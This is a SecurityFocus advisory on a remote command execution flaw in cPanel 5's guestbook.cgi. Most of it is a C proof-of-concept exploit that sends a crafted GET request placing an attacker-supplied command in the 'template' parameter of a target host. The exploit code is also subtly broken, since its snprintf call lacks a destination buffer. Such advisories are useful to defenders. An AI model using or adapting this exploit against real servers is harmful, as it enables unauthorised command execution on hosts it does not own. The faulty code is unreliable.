source: http://www.securityfocus.com/bid/6882/info

A remote command execution vulnerability has been discovered in the cPanel CGI Application. This issue occurs due to insufficient sanitization of externally supplied data to the 'guestbook.cgi' script.

An attacker may exploit this vulnerability to execute commands in the security context of the web server hosting the affected script.

This vulnerability has been reported to affect cPanel version 5, previous versions may also be affected. 

/*
 * DSR-cpanel.c by bob@dtors.net
 * Vulnerbility found by Polkeyzz
 * 
 * This is a Proof of Concept exploit for
 * the cpanel 5 and below. Problem is a open()
 * in guestbook.cgi.
 * 
 * User may view any file or execute commands.
 * There also exists a local vulnerbility to
 * escalate privileges to root.
 * 
 * PoC by bob of dtors.net >>DSR-apache rewrite<<
 */
#include <stdio.h>
#include <unistd.h>
#include <string.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <netdb.h>
int main(int argc, char *argv[]) {
int sock;
char exp[75];
struct in_addr addr;
struct sockaddr_in sin;
struct hostent *bob;
 
fprintf(stdout, "\n\tDSR-cpanel.c By bob.\n"); 
fprintf(stdout, "Proof Of Concept Code for cpanel 5.0 <\n");
fprintf(stdout, "\tDSR-[www.dtors.net]-DSR\n");
 
if(argc<3) 
  {
   fprintf(stderr, "\nUsage : %s <host> <command>\n\n", argv[0]);
   exit(1);
  } 
 
if ((bob=gethostbyname(argv[1])) == NULL)
   {
   fprintf(stderr, "Socket Error!\n\n");
   exit(1);
   }
sock=socket(AF_INET, SOCK_STREAM, 0);
bcopy(bob->h_addr, (char *)&sin.sin_addr, bob->h_length);
sin.sin_family=AF_INET;
sin.sin_port=htons(80);
fprintf(stdout, "Connecting...\n");
if (connect(sock, (struct sockaddr*)&sin, sizeof(sin))!=0)
     {
     fprintf(stderr, "...Problem Connecting, Exited.\n");
     exit(1);
     }
else {
snprintf(sizeof(exp)-1, "GET 
/cgi-sys/guestbook.cgi/user=cpanel&template=%s HTTP/1.1\r\nHost: 
%s\r\n\r\n" ,argv[2], argv[1]);    
write(sock,exp,strlen(exp));
fprintf(stdout, "Command sent/executed!\n\n");
close(sock);
exit (0);
}
}
